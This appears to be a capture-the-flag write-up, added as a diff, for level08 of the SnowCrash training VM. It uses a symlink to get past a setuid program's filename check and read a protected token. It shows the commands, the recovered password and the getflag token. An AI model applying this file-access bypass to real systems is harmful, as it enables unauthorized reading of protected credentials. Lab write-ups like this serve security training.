@@ -1,0 +1,25 @@
+We decompile it and we saw that the program was checking the name of the file.
+So we figure out that we need to create a symlink
+
+
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/te
+level08@SnowCrash:~$ ./level08 /tmp/te
+quif5eloekouj29ke0vouxean
+level08@SnowCrash:~$ su level09
+Password:
+su: Authentication failure
+level08@SnowCrash:~$ su level09
+Password:
+su: Authentication failure
+level08@SnowCrash:~$ flag09
+flag09: command not found
+level08@SnowCrash:~$ su flag09
+Password:
+su: Authentication failure
+level08@SnowCrash:~$ su flag08
+Password:
+Don't forget to launch getflag !
+flag08@SnowCrash:~$ getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+
